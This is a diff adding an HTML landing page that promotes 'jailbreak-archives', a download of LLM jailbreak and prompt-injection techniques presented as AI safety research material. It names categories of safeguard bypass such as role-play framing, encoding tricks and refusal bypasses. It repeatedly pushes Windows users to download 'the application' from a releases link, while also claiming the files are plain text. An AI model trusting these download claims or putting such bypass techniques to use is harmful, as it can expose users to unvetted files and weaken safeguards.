+    border-radius: 10px;
+    padding: 18px 20px;
+  }
+  .notice p:last-child { margin-bottom: 0; }
+  .faq { list-style: none; padding: 0; margin: 0; }
+  .faq li { margin-bottom: 18px; }
+  .faq strong { display: block; color: #111827; margin-bottom: 4px; }
+  footer {
+    text-align: center;
+    color: var(--muted);
+    font-size: 14px;
+    padding-top: 8px;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .wrap { padding: 20px 14px 48px 14px; }
+    .hero { padding: 26px 20px; }
+    section { padding: 22px 18px; }
+    h1 { font-size: 26px; }
+    .btn { display: block; text-align: center; font-size: 17px; padding: 15px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <span class="kicker">AI Safety Research Archive</span>
+    <h1>🗂️ jailbreak-archives - Study Real AI Safety Weaknesses</h1>
+    <p class="lede">A structured, versioned archive of adversarial prompt engineering techniques against Large Language Models — collected for AI safety research, red-teaming, and defensive hardening. Everything is organized, dated, and ready to browse on your Windows computer.</p>
+    <a class="btn" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases">⬇️ Get the Archive Now</a>
+    <span class="btn-note">Visit this link to download the application. No account or payment needed.</span>
+  </header>
+
+  <section>
+    <h2>👋 What Is jailbreak-archives?</h2>
+    <p>jailbreak-archives is a library of documented adversarial prompts — the kinds of clever, tricky, or unusual instructions people use to test how far an AI chatbot will go. Instead of scattered screenshots and half-finished notes, this project keeps everything in one tidy, versioned collection.</p>
+    <p>Each entry is organized so you can see what the technique does, which AI models it was tested against, and why it matters for safety. Because the archive is versioned, you always know whether you are looking at the latest research batch or an earlier snapshot from months ago.</p>
+    <p>The audience is broad. Security researchers use it to build better defenses. Students use it to understand how language models can be steered off course. Teams building chatbots use it to check whether their own guardrails hold up. You do not need to be a programmer to browse it — the material is presented in plain, readable files.</p>
+    <div class="grid">
+      <div class="tile">
+        <h3>📚 Organized by category</h3>
+        <p>Prompt injection, role-play framing, encoding tricks, refusal bypasses and more — each in its own folder.</p>
+      </div>
+      <div class="tile">
+        <h3>🗓️ Versioned releases</h3>
+        <p>Every update is published as a numbered release, so you can track how techniques and defenses evolve over time.</p>
+      </div>
+      <div class="tile">
+        <h3>🛡️ Defense-oriented notes</h3>
+        <p>Each technique is paired with a short explanation of how a model or product could detect and resist it.</p>
+      </div>
+      <div class="tile">
+        <h3>🤝 Responsible disclosure</h3>
+        <p>Findings are shared for research and hardening, with vendor-friendly summaries included.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>🚀 Download &amp; Setup on Windows</h2>
+    <p>Getting the archive onto your computer takes only a moment. Follow these three simple steps in order.</p>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Click the button below (or the one at the top of this page). It takes you straight to the official releases page for jailbreak-archives.</li>
+      <li><strong>Pick the newest release.</strong> The releases page lists each version with its date. The top entry is the most recent one, which is the version you want.</li>
+      <li><strong>Save the file to your computer.</strong> Use the download option shown on that release entry, then keep the file in a folder you can easily find again, such as your Downloads folder.</li>
+    </ol>
+    <p><a class="btn" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases">⬇️ Open the Download Page</a></p>
+    <span class="btn-note">Visit this link to download the application. All files are published openly and free of charge.</span>
+  </section>
+
+  <section>
+    <h2>🧭 How to Explore the Archive</h2>
+    <p>Once the files are saved, you can work with them like any other folder on a Windows computer. Nothing needs to be installed and no background service runs on your machine.</p>
+    <ul>
+      <li><strong>Start at the top level.</strong> Open the main folder and look for the readme file inside — it explains the folder layout in plain language.</li>
+      <li><strong>Browse by category.</strong> Each subfolder groups techniques by type, so you can jump straight to the area that interests you.</li>
+      <li><strong>Read the entry headers.</strong> Every entry begins with a short summary, the model family it targets, and a note on why it is relevant to safety work.</li>
+      <li><strong>Check the version notes.</strong> The release notes tell you what was added, revised, or retired in that edition of the archive.</li>
+    </ul>
+    <p>If you prefer to skim rather than read deeply, open the summary index first. It lists every technique with a one-line description so you can decide what is worth a closer look.</p>
+  </section>
+
+  <section>
+    <h2>🧰 What You Can Do With It</h2>
+    <div class="grid">
+      <div class="tile">
+        <h3>🔍 Audit your own chatbot</h3>
+        <p>Run the documented cases against your product and see whether your safeguards respond the way you expect.</p>
+      </div>
+      <div class="tile">
+        <h3>🎓 Teach a class or workshop</h3>
+        <p>The categorized structure makes it easy to build a lesson plan around real, documented examples.</p>
+      </div>
+      <div class="tile">
+        <h3>📈 Track trends over time</h3>
+        <p>Compare releases to see which older techniques stop working and which new patterns start appearing.</p>
+      </div>
+      <div class="tile">
+        <h3>🧪 Write better test cases</h3>
+        <p>Use the entries as a foundation for your own evaluation suites instead of starting from a blank page.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>👥 Who This Is For</h2>
+    <p>This archive is aimed at people who need a reliable reference rather than scattered forum posts. That includes AI safety researchers documenting model behavior, red teams testing products before launch, security professionals mapping out attack surfaces, policy teams who need concrete examples, and curious learners who want to understand how modern language models are probed.</p>
+    <p>You do not need to write code to benefit. The files are readable in any text editor and open on Windows without extra software. You only need a web browser to reach the download page and a folder where you can keep the archive.</p>
+  </section>
+
+  <section>
+    <h2>⚖️ Responsible Use</h2>
+    <div class="notice">
+      <p>This archive exists to make AI systems safer. Use it to test systems you own or have explicit permission to test, and to strengthen defenses rather than weaken them.</p>
+      <p>Do not use these materials to harass people, to bypass safeguards on services you do not control, or to produce harmful content. If you discover a new weakness in a commercial product, report it privately to the vendor before publishing anything about it.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>🏷️ Topics Covered</h2>
+    <p>The archive spans the full range of language model security work. Areas represented include:</p>
+    <ul class="chips">
+      <li>adversarial-prompts</li>
+      <li>ai-red-team</li>
+      <li>ai-safety</li>
+      <li>chatbot</li>
+      <li>chatgpt</li>
+      <li>claude</li>
+      <li>cybersecurity</li>
+      <li>deepseek</li>
+      <li>jailbreak</li>
+      <li>jailbreak-prompts</li>
+      <li>jailbreak-script</li>
+      <li>llm</li>
+      <li>llm-jailbreak</li>
+      <li>llm-security</li>
+      <li>offensive-security</li>
+      <li>prompt-engineering</li>
+      <li>prompt-injection</li>
+      <li>qwen</li>
+      <li>red-teaming</li>
+      <li>responsible-disclosure</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>❓ Common Questions</h2>
+    <ul class="faq">
+      <li>
+        <strong>Is this free?</strong>
+        Yes. The archive is published openly and can be downloaded at no cost from the releases page.
+      </li>
+      <li>
+        <strong>Do I need special software?</strong>
+        No. The files open in any basic text editor that ships with Windows. You only need a web browser to reach the download link.
+      </li>
+      <li>
+        <strong>How do I know I have the latest version?</strong>
+        The releases page lists versions newest to oldest. The entry at the top is always the most recent publication.
+      </li>
+      <li>
+        <strong>What if a download looks broken?</strong>
+        Return to the releases page and choose the download option again from the same entry. Files are replaced only when a new numbered release is published.
+      </li>
+      <li>
+        <strong>Can I share the archive with my team?</strong>
+        Yes. Share the releases page link rather than sending copies around, so everyone stays on the same version.
+      </li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>📥 Ready to Begin?</h2>
+    <p>The full collection is one click away. Head to the releases page, choose the newest version, and save it to a folder you will remember.</p>
+    <p><a class="btn" href="https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases">⬇️ Download jailbreak-archives</a></p>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </section>
+
+  <footer>
+    jailbreak-archives — a versioned archive for AI safety research, red-teaming, and defensive hardening.
+  </footer>
+
+</div>
+</body>
+</html>
+```
